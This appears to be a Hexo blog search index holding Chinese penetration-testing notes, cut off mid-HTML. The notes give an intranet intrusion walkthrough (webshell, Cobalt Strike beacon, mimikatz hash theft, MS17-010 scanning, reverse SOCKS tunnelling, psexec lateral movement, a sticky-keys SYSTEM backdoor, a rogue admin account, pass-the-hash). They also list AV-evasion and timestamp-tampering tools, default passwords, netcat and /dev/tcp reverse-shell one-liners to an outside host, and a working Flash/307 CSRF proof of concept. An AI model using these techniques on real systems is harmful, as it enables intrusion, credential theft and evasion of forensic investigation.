<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>渗透工具项目推荐</title>
    <url>/2025/04/23/github%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AE%E6%8E%A8%E8%8D%90/</url>
    <content><![CDATA[<h1 id="GitHub项目："><a href="#GitHub项目：" class="headerlink" title="GitHub项目："></a>GitHub项目：</h1><span id="more"></span>

<h3 id="内网："><a href="#内网：" class="headerlink" title="内网："></a>内网：</h3><h5 id="内存码注入"><a href="#内存码注入" class="headerlink" title="内存码注入"></a>内存码注入</h5><h6 id="pap1rman"><a href="#pap1rman" class="headerlink" title="pap1rman"></a><a href="https://github.com/pap1rman/JNDIExploit-modify/commits?author=pap1rman">pap1rman</a></h6><h3 id="bp插件："><a href="#bp插件：" class="headerlink" title="bp插件："></a>bp插件：</h3><h5 id="爆破类"><a href="#爆破类" class="headerlink" title="爆破类"></a>爆破类</h5><h6 id="Hannah-PortSwigger"><a href="#Hannah-PortSwigger" class="headerlink" title="Hannah-PortSwigger"></a><a href="https://github.com/PortSwigger/turbo-intruder/commits?author=Hannah-PortSwigger">Hannah-PortSwigger</a></h6><h5 id="伪造类"><a href="#伪造类" class="headerlink" title="伪造类"></a>伪造类</h5><h6 id="隐藏bp的指纹特征"><a href="#隐藏bp的指纹特征" class="headerlink" title="隐藏bp的指纹特征"></a><a href="https://github.com/sleeyax/burp-awesome-tls">隐藏bp的指纹特征</a></h6><h6 id="伪造ip"><a href="#伪造ip" class="headerlink" title="伪造ip"></a><a href="https://github.com/TheKingOfDuck/burpFakeIP">伪造ip</a></h6><h3 id="探测漏洞："><a href="#探测漏洞：" class="headerlink" title="探测漏洞："></a>探测漏洞：</h3><h5 id="开源漏扫"><a href="#开源漏扫" class="headerlink" title="开源漏扫"></a>开源漏扫</h5><h6 id=""><a href="#" class="headerlink" title=""></a></h6><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><h5 id="框架漏洞"><a href="#框架漏洞" class="headerlink" title="框架漏洞"></a>框架漏洞</h5><h6 id="nacos-vul"><a href="#nacos-vul" class="headerlink" title="nacos_vul"></a><a href="https://github.com/Pizz33/nacos_vul">nacos_vul</a></h6><h3 id="云服务器漏洞排查"><a href="#云服务器漏洞排查" class="headerlink" title="云服务器漏洞排查"></a>云服务器漏洞排查</h3><h5 id="条件命令执行"><a href="#条件命令执行" class="headerlink" title="条件命令执行"></a>条件命令执行</h5><!--获取`accesskeyid`和`accesskeysecrets`后可使用工具接管云-->

<h6 id="teamssix"><a href="#teamssix" class="headerlink" title="teamssix"></a><a href="https://github.com/teamssix/teamssix">teamssix</a></h6><h6 id="aliyun-accesskey-Tools"><a href="#aliyun-accesskey-Tools" class="headerlink" title="aliyun-accesskey-Tools"></a><a href="https://github.com/mrknow001/aliyun-accesskey-Tools">aliyun-accesskey-Tools</a></h6>]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>project</tag>
      </tags>
  </entry>
  <entry>
    <title>内网信息搜集</title>
    <url>/2025/04/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    <content><![CDATA[<h1 id="Windows常用搜集命令："><a href="#Windows常用搜集命令：" class="headerlink" title="Windows常用搜集命令："></a>Windows常用搜集命令：</h1><table>
<thead>
<tr>
<th align="left"><code>ipconfig /all</code></th>
<th>查询网络配置信息</th>
</tr>
</thead>
<tbody><tr>
<td align="left">systeminfo | findstr &#x2F;B &#x2F;C:”OS 名称” &#x2F;C:”OS 版本”</td>
<td>查询操作系统版本-中文</td>
</tr>
<tr>
<td align="left">systeminfo | findstr &#x2F;B &#x2F;C:”OS Name” &#x2F;C:”OS Version”</td>
<td>查询操作系统版本-英文</td>
</tr>
<tr>
<td align="left">echo %PROCESSOR_ARCHITECTURE%</td>
<td>查看系统体系结构</td>
</tr>
<tr>
<td align="left">wmic product get name,version</td>
<td>安装软件版本信息</td>
</tr>
<tr>
<td align="left">powershell “Get-WmiObject -class Win32_Product | Select-Object -Property name,version”</td>
<td>收集软件版本信息</td>
</tr>
<tr>
<td align="left">wmic service list brief</td>
<td>查询本机服务信息</td>
</tr>
<tr>
<td align="left"><code>tasklist /svc</code></td>
<td>查询进程列表信息</td>
</tr>
<tr>
<td align="left">wmic startup get command,caption</td>
<td>查看启动程序信息</td>
</tr>
<tr>
<td align="left">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v</td>
<td>查看计划任务信息</td>
</tr>
<tr>
<td align="left">net statistics workstation</td>
<td>查看主机开机时间</td>
</tr>
<tr>
<td align="left">net user</td>
<td>查询用户列表信息</td>
</tr>
<tr>
<td align="left">net localgroup administrators</td>
<td>获取本地管理员（通常含有域用户）</td>
</tr>
<tr>
<td align="left">query user || qwinsta</td>
<td>查看当前在线用户信息</td>
</tr>
<tr>
<td align="left">net session</td>
<td>查客户端会话信息(管理员权限)</td>
</tr>
<tr>
<td align="left"><code>netstat -ano</code></td>
<td>查询端口列表信息</td>
</tr>
<tr>
<td align="left"><code>Systeminfo</code></td>
<td>查询补丁列表信息</td>
</tr>
<tr>
<td align="left">wmic qfe get Caption,Description,HotFixID,InstalledOn</td>
<td>wmic来识别安装在系统中的补丁</td>
</tr>
<tr>
<td align="left"><code>net share</code></td>
<td>查看本机共享信息</td>
</tr>
</tbody></table>
<span id="more"></span>

<h1 id="LINUX常用搜集命令："><a href="#LINUX常用搜集命令：" class="headerlink" title="LINUX常用搜集命令："></a>LINUX常用搜集命令：</h1><table>
<thead>
<tr>
<th><code>ifconfig -a</code> 或 <code>ip a</code></th>
<th>查询网络配置信息</th>
</tr>
</thead>
<tbody><tr>
<td><code>uname -a</code></td>
<td>查询系统内核及版本信息</td>
</tr>
<tr>
<td><code>cat /etc/os-release</code> 或 <code>lsb_release -a</code></td>
<td>查询操作系统版本信息</td>
</tr>
<tr>
<td><code>arch</code> 或 <code>uname -m</code></td>
<td>查看系统体系结构</td>
</tr>
<tr>
<td><code>dpkg -l</code> (Debian&#x2F;Ubuntu) 或 <code>rpm -qa</code> (RHEL&#x2F;CentOS)</td>
<td>安装软件版本信息</td>
</tr>
<tr>
<td><code>service --status-all</code> 或 <code>systemctl list-units --type=service</code></td>
<td>查询本机服务信息</td>
</tr>
<tr>
<td><code>ps aux</code></td>
<td>查询进程列表信息</td>
</tr>
<tr>
<td><code>ls /etc/init.d/</code> 或 <code>ls /etc/systemd/system/</code></td>
<td>查看启动程序信息</td>
</tr>
<tr>
<td><code>crontab -l</code> 或 <code>ls /etc/cron.*</code></td>
<td>查看计划任务信息</td>
</tr>
<tr>
<td><code>uptime</code></td>
<td>查看主机运行时间</td>
</tr>
<tr>
<td><code>cat /etc/passwd</code></td>
<td>查询用户列表信息</td>
</tr>
<tr>
<td><code>cat /etc/group</code></td>
<td>获取用户组信息（包括管理员组）</td>
</tr>
<tr>
<td><code>who</code> 或 <code>w</code></td>
<td>查看当前在线用户信息</td>
</tr>
<tr>
<td><code>netstat -antp</code> 或 <code>ss -tulnp</code></td>
<td>查询端口列表信息</td>
</tr>
<tr>
<td><code>apt list --installed</code> (Debian&#x2F;Ubuntu) 或 <code>yum list installed</code> (RHEL&#x2F;CentOS)</td>
<td>查询已安装软件包（包含部分补丁信息）</td>
</tr>
<tr>
<td><code>ls /mnt/</code> 或 <code>mount</code></td>
<td>查看挂载的共享信息</td>
</tr>
<tr>
<td><code>df -h</code></td>
<td>查看磁盘使用情况</td>
</tr>
<tr>
<td><code>free -h</code></td>
<td>查看内存使用情况</td>
</tr>
<tr>
<td><code>lscpu</code></td>
<td>查看CPU信息</td>
</tr>
<tr>
<td><code>dmidecode -t system</code></td>
<td>查看系统硬件信息（需要root权限）</td>
</tr>
<tr>
<td><code>journalctl -u &lt;service_name&gt;</code></td>
<td>查看特定服务的日志信息</td>
</tr>
<tr>
<td><code>cat /etc/hosts</code></td>
<td>查看主机名和IP映射</td>
</tr>
<tr>
<td><code>hostnamectl</code></td>
<td>查看主机名和系统信息</td>
</tr>
</tbody></table>
<p>注：</p>
<ol>
<li>部分命令可能需要root权限才能获取完整信息（可在命令前加<code>sudo</code>）</li>
<li>不同Linux发行版可能需要使用对应的包管理命令（apt&#x2F;yum&#x2F;dnf等）</li>
<li>对于较新的系统，推荐使用<code>ip</code>替代<code>ifconfig</code>，使用<code>ss</code>替代<code>netstat</code></li>
</ol>
<h1 id="内存码的注入："><a href="#内存码的注入：" class="headerlink" title="内存码的注入："></a>内存码的注入：</h1><p>[内存马注入]: <a href="https://github.com/pap1rman/JNDIExploit-modify">https://github.com/pap1rman/JNDIExploit-modify</a>	“参考如下：”</p>
<ul>
<li><a href="https://github.com/veracode-research/rogue-jndi">https://github.com/veracode-research/rogue-jndi</a></li>
<li><a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></li>
<li><a href="https://github.com/welk1n/JNDI-Injection-Bypass">https://github.com/welk1n/JNDI-Injection-Bypass</a></li>
</ul>
<h1 id="完整的内网渗透"><a href="#完整的内网渗透" class="headerlink" title="完整的内网渗透"></a>完整的内网渗透</h1><h2 id="简略："><a href="#简略：" class="headerlink" title="简略："></a>简略：</h2><p>1.获取shell—无论是sql注入提权还是webshell还是直接ssh等，获取shell后</p>
<p>2.cs上线—下载powershell等工具或者jar直接上线</p>
<p>3.如上信息搜集，进行横向，域内横向，类似于操作1.直接找shell</p>
<p>（3）.可以尝试<strong>sock代理</strong>，使同一网，进行msf的扫描，有的话就是捷径</p>
<p>（3）.有备份的话可以直接拷贝<strong>全量备份</strong>，它能在你本地横？可以cmd覆盖</p>
<p>（3）.<strong>基础操作</strong>：主机端口，内网web，系统&#x2F;框架漏洞</p>
<p>(技巧)[<a href="https://www.cnblogs.com/backlion/category/1181220.html]">https://www.cnblogs.com/backlion/category/1181220.html]</a></p>
<h2 id="详细"><a href="#详细" class="headerlink" title="详细"></a>详细</h2><p>1.通过fofa搜索到目标系统是采用weblogic框架，通过weblogic利用工具可执行命令，这里上传冰蝎一句话到目标网站系统。并查询到目标系统存在小众的防火墙，经测试该防火墙对ps脚本不拦截。</p>
<p>2.在VPS上通过cd自带的Scripted Web Delivery模块，直接创建一个web服务用于一键下载和执行powershel。</p>
<p>URL路径：&#x2F;a&#x2F;123   主机地址：目标系统IP   端口：80  监听器：https   类型：posershell</p>
<p>3.执行powershel，然后CS成功上线。</p>
<p>4.通过C命令查询目标系统信息,发现目标系统是win2012 ，目标内网IP为192.168.200.21</p>
<p>shell systeminfo</p>
<p>shell ipconfig</p>
<p>5。通过cs将ladon上传到目标系统中，通过ladon扫描内网系统.,发现目标有一个WEB服务主机。</p>
<p>landon 192.168.200.1&#x2F;24    OsScan</p>
<p>6。通过mimikatz成功读取到用户名和密码hash值，通过md5对密码的NTML进行解密，成功解密为P@sssw0rd。</p>
<p>7,通过ladon进行批量ms17-010扫描，发现存有几个系统存在ms17-010漏洞</p>
<p>landon 192.168.200.1&#x2F;24 MS17010</p>
<p>8.在公网VPS上执行以下命令，将1900端口收到的代理请求转交给反连1200端口的主机</p>
<p>ew -s rcsocks -l 1900 -e 1200</p>
<p>9.将ew通过冰蝎上传目标系统中，并执行以下命令,开启目标主机socks5服务并反向连接到中转机器的1200端口</p>
<p>ew -s rssocks -d xxx.xxx.xxx.xxx(公网VPS IP) -e 1200</p>
<p>10.本地WINDOWS在本地使用sockscap配置好socke5代理，本地虚拟机里面的kali的MSF，kali的代理配置比较方便，先vim &#x2F;etc&#x2F;proxychains.conf ，添加sock5嗲了</p>
<p>socks5  目标IP  1900</p>
<p>11.在kali下msf要挂代理，就直接：proxychains msfconsole，在windows中sockscap添加ie浏览器访问的socks5代理，用于内网web访问，但是测试弱口令发现无法进入。</p>
<p>12.继续信息收集，查看登录凭证，并有任何东西</p>
<p>shell  cmdkey  &#x2F;l</p>
<p>13.查看共享计算机列表，并尝试访问计算机C盘,发现备份计算机可以访问共享</p>
<p>shell  ne  view</p>
<p>ls   \VEEAM-BACKUP$</p>
<p>14.通过ping目标共享计算机，查询出IP地址为192.168.200.6</p>
<p>ping   VEEAM-BACKUP</p>
<p>15.在CS上创建一个监听器</p>
<p>中转—监听—名字（c2)、payload(windows&#x2F;beacon_reverse_tcp)、listen host :192.168.200.21  、listen port:4444</p>
<p>16.接着使用psexec_psh尝试上线192.168.200.6这台服务器,成功上线，起初发现该主机上并没有任何东西</p>
<p>jump  psexec _psh  192.168.200.6</p>
<p>17.通过之前ladon探测发现内网中22,1,5,11主机是linux系统，尝试弱口令，发现192.168.200.22存在弱口令，linux主机上并没有任何可利用的</p>
<p>ssh  192.168.200.22  root  123456</p>
<p>18.在VEEAM-BACKUP主机上发现了有一个Backup的文件，里面存放了三个机器的备份，它是一款叫Veeam® Backup &amp; Replication的软件，他的功能是专门为Vsphere等做备份。</p>
<p>19.发现VEEAM-BACKUP不出外网，这里通过7z将Backup文件进行命令打包压缩。在目标系统中的web目录下，通过命令共享将Backup文件拷贝到目标系统中。</p>
<p>19.在本地安装Backup &amp; Replication，并将备份文件进行恢复还原，发现登录窗口处有默认的用户名和密码以及IP，这个需要在目标内网中登录，这里可以通过在目标系统中通过cs开启sock4代理，本地通过Proxifier加载Backup &amp; Replication的sock4代理成功访问。</p>
<p>20.本地下载的那个全量备份在本地还原也很简单，只需要装了软件双击就回自动打开软件进行还原</p>
<p>21.通过老毛桃的win pe进入系统，这里重命名cmd.exe为osk.exe将原来C盘中的\windows\system32\osk.exe给覆盖了，这样子在开机的时候打开屏幕键盘就会弹出SYSTEM权限的命令行。</p>
<p>22.通过命令查询，发现还原的系统是域普通主机，这里通过命令添加用并将域用户修改密码后添加到本地管理员组成功进入了系统。</p>
<p>net user   hanli  quer1345 @  &#x2F;add</p>
<p>net localgroup administrators  hanli  &#x2F;add</p>
<p>23.在虚拟机中通过执行cs的后门成功上线，并通过cs的hasdump读取hash,并通过该hash进行域控HASH传递</p>
<h2 id="免杀项目："><a href="#免杀项目：" class="headerlink" title="免杀项目："></a>免杀项目：</h2><p><a href="https://github.com/wangfly-me/LoaderFly">https://github.com/wangfly-me/LoaderFly</a></p>
<p><a href="https://github.com/Pizz33/Qianji">https://github.com/Pizz33/Qianji</a></p>
<p>可以定期去github上关注一些好用的bof</p>
<h1 id="应对技巧："><a href="#应对技巧：" class="headerlink" title="应对技巧："></a>应对技巧：</h1><p>1.上传的木马都是新的</p>
<p>​	可以查看更改时间和最近操作得到，得到直接保存沙盒删除溯源一条龙</p>
<p>注：<a href="https://github.com/MsF-NTDLL/ChTimeStamp">https://github.com/MsF-NTDLL/ChTimeStamp</a></p>
<p>该项目可以实现修改文件时间</p>
<h1 id="默认口令："><a href="#默认口令：" class="headerlink" title="默认口令："></a>默认口令：</h1><p>系统管理员：system&#x2F;system<br>    集团管理员(A8-v5集团版) group-admin&#x2F;123456<br>    单位管理员(A8-V5企业版) admin1&#x2F;admin123456<br>    审计管理员(所有版本) audit-admin&#x2F;seeyon123456</p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>Computer-info</tag>
      </tags>
  </entry>
  <entry>
    <title>命令的熟悉</title>
    <url>/2025/04/23/%E5%91%BD%E4%BB%A4%E7%9A%84%E7%86%9F%E6%82%89/</url>
    <content><![CDATA[<h1 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h1><p>nc、待补充</p>
<span id="more"></span>

<h3 id="nc"><a href="#nc" class="headerlink" title="nc:"></a>nc:</h3><p>​	常用：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#正向连接</span></span><br><span class="line">nc <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">6666</span> <span class="literal">-e</span> <span class="string">&quot;/bin/bash -i&quot;</span></span><br><span class="line">nc <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">6666</span> <span class="literal">-e</span> /bin/bash <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"><span class="comment">#反向连接</span></span><br><span class="line">bash <span class="literal">-i</span> &gt; /dev/tcp/<span class="number">81</span>.X.X.X/<span class="number">6666</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#只允许192.168.1.100连接</span></span><br><span class="line"></span><br><span class="line">nc <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">6666</span> <span class="literal">-e</span> <span class="string">&quot;/bin/bash -i&quot;</span> <span class="literal">-s</span> <span class="number">192.168</span>.<span class="number">1.100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#监听并记录访问者信息</span></span><br><span class="line"></span><br><span class="line">nc <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">8080</span> <span class="literal">-v</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">tee</span> <span class="literal">-a</span> access.log</span><br></pre></td></tr></table></figure>



<table>
<thead>
<tr>
<th align="left"><strong>用途</strong></th>
<th align="left"><strong>命令示例</strong></th>
<th align="left"><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left">临时聊天</td>
<td align="left"><code>nc -l -p 8080</code> + <code>nc &lt;IP&gt; 8080</code></td>
<td align="left">双向文本通信</td>
</tr>
<tr>
<td align="left">文件传输（发送→接收）</td>
<td align="left"><code>nc -l -p 8080 &gt; file</code> + <code>nc &lt;IP&gt; 8080 &lt; file</code></td>
<td align="left">替代SCP&#x2F;FTP</td>
</tr>
<tr>
<td align="left">反向Shell</td>
<td align="left"><code>nc -l -p 8080 -e /bin/bash</code> + <code>nc &lt;IP&gt; 8080</code></td>
<td align="left"><strong>高风险！仅测试用</strong></td>
</tr>
<tr>
<td align="left">端口扫描</td>
<td align="left"><code>nc -zv &lt;IP&gt; 8080</code></td>
<td align="left">检查端口状态</td>
</tr>
<tr>
<td align="left">HTTP调试</td>
<td align="left"><code>nc -l -p 8080</code> + <code>curl http://&lt;IP&gt;:8080</code></td>
<td align="left">查看原始HTTP请求</td>
</tr>
<tr>
<td align="left">TCP代理</td>
<td align="left">&#96;nc -l -p 8080</td>
<td align="left">nc &lt;目标IP&gt; 80&#96;</td>
</tr>
<tr>
<td align="left">十六进制调试</td>
<td align="left">&#96;nc -l -p 8080</td>
<td align="left">hexdump -C&#96;</td>
</tr>
<tr>
<td align="left">持久监听</td>
<td align="left"><code>while true; do nc -l -p 8080; done</code></td>
<td align="left">支持多次连接</td>
</tr>
<tr>
<td align="left">SSL加密通信</td>
<td align="left"><code>ncat -l -p 8080 --ssl</code> + <code>ncat &lt;IP&gt; 8080 --ssl</code></td>
<td align="left">需安装<code>ncat</code></td>
</tr>
</tbody></table>
<p>注：nc -l -p 8080 -e “&#x2F;bin&#x2F;bash -i”			&#x2F;&#x2F;j交互模式</p>
<p>​	nc -l -p 8080 -e “&#x2F;bin&#x2F;bash -i 2&gt;&amp;1”		&#x2F;&#x2F;全回显，2&gt;&amp;1 表示将 标准错误（stderr） 重定向到 标准输出（stdout），确保错误信息也能回显。</p>
<table>
<thead>
<tr>
<th align="left">需求</th>
<th align="left">命令</th>
</tr>
</thead>
<tbody><tr>
<td align="left">简单回显（<code>nc</code>）</td>
<td align="left"><code>nc -l -p 8080 -e &quot;/bin/bash -i 2&gt;&amp;1&quot;</code></td>
</tr>
<tr>
<td align="left">完整终端支持（<code>nc</code>）</td>
<td align="left"><code>nc -l -p 8080 -e &quot;script -q -c &#39;/bin/bash -i&#39; /dev/null 2&gt;&amp;1&quot;</code></td>
</tr>
<tr>
<td align="left">最佳兼容性（<code>socat</code>）</td>
<td align="left"><code>socat TCP-LISTEN:8080,reuseaddr,fork EXEC:&quot;/bin/bash -i&quot;,pty,stderr</code></td>
</tr>
</tbody></table>
<h5 id="应急"><a href="#应急" class="headerlink" title="应急"></a>应急</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找 nc 进程</span></span><br><span class="line">ps aux | grep &#x27;nc -l&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">直接用 pkill 终止所有 nc 进程</span></span><br><span class="line">pkill -f &#x27;nc -l&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">杀死进程（假设进程ID是 12345）</span></span><br><span class="line">kill 12345</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或者强制杀死</span></span><br><span class="line">kill -9 12345</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>computer</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF记录</title>
    <url>/2025/04/17/CSRF%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="笔记-CSRF-极简分类"><a href="#笔记-CSRF-极简分类" class="headerlink" title="笔记-CSRF-极简分类"></a>笔记-CSRF-极简分类</h1><p>1-简单</p>
<p>get+post_forms</p>
<p>只接受三种类型，text&#x2F;plain、urlendocde、忘了</p>
<p>2-中等</p>
<p>限定type，例如最典型的：post-json</p>
<p>可以尝试几种常见方式 js、flash307、WebSocket、http请求走私等</p>
<p>*浏览器或者所在浏览的平台安全策略严谨的话建议当它没有csrf</p>
<p>3-安全</p>
<p>安全，以目前技术没希望的，或者只能</p>
<p>钓鱼、xss、cors等联合漏洞实现的</p>
<hr>
<span id="more"></span>

<h2 id="flash方法"><a href="#flash方法" class="headerlink" title="flash方法"></a>flash方法</h2><p>若是服务器只校验post+content-type：json且存在请求体，八成相当于没有csrf</p>
<p>利用难点：	打开网址A的时候打开网址B</p>
<p>​			若是网址接收option也可以直接用js操作</p>
<p>​			服务器对发送种类限制，例如：json</p>
<p>正常来说没人管这个csrf，毕竟要联合xss或者其他反射的漏洞才能造成较大危害</p>
<p>可以用（CSRF + Flash + HTTP 307）继续绕过服务器对发送种类限制，例如：json</p>
<h2 id="绕过json项目："><a href="#绕过json项目：" class="headerlink" title="绕过json项目："></a>绕过json项目：</h2><p><a href="https://github.com/appsecco/json-flash-csrf-poc">json-flash-csrf-poc</a></p>
<p>*注意：需要用户浏览器启用 Flash</p>
<p>​    	*<strong>浏览器实现可能不同</strong>  所以 <strong>307 重定向默认会变成 GET 请求</strong>（即使原请求是 POST）</p>
<p>需要安装mxmlc命令，flex-config.xml内的playerglobal指向的参数可能要更改，以及32.0&#x2F;43或者27.0&#x2F;38</p>
<h3 id="PoC工作流程"><a href="#PoC工作流程" class="headerlink" title="PoC工作流程"></a>PoC工作流程</h3><p>下面给出的是攻击的整个过程，其中目标用户的浏览器必须启用Flash：</p>
<p>\1.   用户在浏览器中登录<a href="http://victim-site/">http://victim-site/</a>。</p>
<p>\2.   用户被重定向到<a href="http://attacker-ip:8000/csrf.swf">http://attacker-ip:8000/csrf.swf</a>。</p>
<p>\3.   Flash文件加载成功，并向<a href="http://attacker-ip:8000/">http://attacker-ip:8000/</a>发送带有自定义Header的POST Payload。</p>
<p>\4.   攻击者的服务器发送HTTP 307重定向，这样便能让POST响应body和自定义HTTP头按原样发送到 <a href="http://victim-site/">http://victim-site/</a>。</p>
<p>\5.   目标用户刷新自己的 <a href="http://victim-site/">http://victim-site/</a> 页面，并发现自己的帐户已经被删除了。</p>
<h1 id="POC-1"><a href="#POC-1" class="headerlink" title="POC-1"></a>POC-1</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;&#x27;</span></span><br><span class="line">PORT = <span class="number">8000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RedirectHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.path == <span class="string">&#x27;/csrf.swf&#x27;</span>:</span><br><span class="line">            <span class="variable language_">self</span>.send_response(<span class="number">200</span>)</span><br><span class="line">            <span class="variable language_">self</span>.send_header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-shockwave-flash&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.end_headers()</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;csrf.swf&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="variable language_">self</span>.wfile.write(f.read())</span><br><span class="line">            <span class="keyword">return</span> </span><br><span class="line">        <span class="variable language_">self</span>.send_response(<span class="number">307</span>)</span><br><span class="line">        <span class="variable language_">self</span>.send_header(<span class="string">&quot;Location&quot;</span>, <span class="string">&quot;http://192.168.43.66:5000/api/test&quot;</span>)</span><br><span class="line">        <span class="comment">##该url为希望执行操作的网址</span></span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">self</span>.end_headers()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="variable language_">self</span>.path)</span><br><span class="line">        <span class="variable language_">self</span>.do_POST()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    server_class = HTTPServer</span><br><span class="line">    httpd = server_class((HOST, PORT), RedirectHandler)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s Server Starts - %s:%s&#x27;</span> % (time.asctime(), HOST <span class="keyword">or</span> <span class="string">&#x27;0.0.0.0&#x27;</span>, PORT))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        httpd.serve_forever()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    httpd.server_close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s Server Stops - %s:%s&#x27;</span> % (time.asctime(), HOST <span class="keyword">or</span> <span class="string">&#x27;0.0.0.0&#x27;</span>, PORT))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">  import flash.display.Sprite;</span><br><span class="line">  import flash.net.URLLoader;</span><br><span class="line">  import flash.net.URLRequest;</span><br><span class="line">  import flash.net.URLRequestHeader;</span><br><span class="line">  import flash.net.URLRequestMethod;</span><br><span class="line">public class csrf extends Sprite</span><br><span class="line">  &#123;</span><br><span class="line">    public function csrf()</span><br><span class="line">    &#123;</span><br><span class="line">      super();</span><br><span class="line">      var member1:Object = null;</span><br><span class="line">      var myJson:String = null;</span><br><span class="line">      member1 = new Object();</span><br><span class="line">      member1 = &#123;</span><br><span class="line">          &quot;acctnum&quot;:&quot;100&quot;,</span><br><span class="line">          &quot;confirm&quot;:&quot;true&quot;</span><br><span class="line">      &#125;;</span><br><span class="line">      var myData:Object = member1;</span><br><span class="line">      myJson = JSON.stringify(myData);</span><br><span class="line">      var url:String = &quot;http://127.0.0.1:8000&quot;;</span><br><span class="line">      ##该ip为攻击者服务器</span><br><span class="line">      var request:URLRequest = new URLRequest(url);</span><br><span class="line">      request.requestHeaders.push(new URLRequestHeader(&quot;Content-Type&quot;,&quot;application/json&quot;));</span><br><span class="line">      request.data = myJson;</span><br><span class="line">      request.method = URLRequestMethod.POST;</span><br><span class="line">      var urlLoader:URLLoader = new URLLoader();</span><br><span class="line">try</span><br><span class="line">      &#123;</span><br><span class="line">          urlLoader.load(request);</span><br><span class="line">          return;</span><br><span class="line">      &#125;</span><br><span class="line">      catch(e:Error)</span><br><span class="line">      &#123;</span><br><span class="line">          trace(e);</span><br><span class="line">          return;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">###下方代码为伪装的网页，不用也可以，只要输入攻击者ip也会被定向，效果一样的</span><br><span class="line">（会被过滤成get型）</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Flash Game - Play Now!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 伪装成正常网页，诱使用户访问 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: Arial, sans-serif;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.flash-container</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">20px</span> auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span 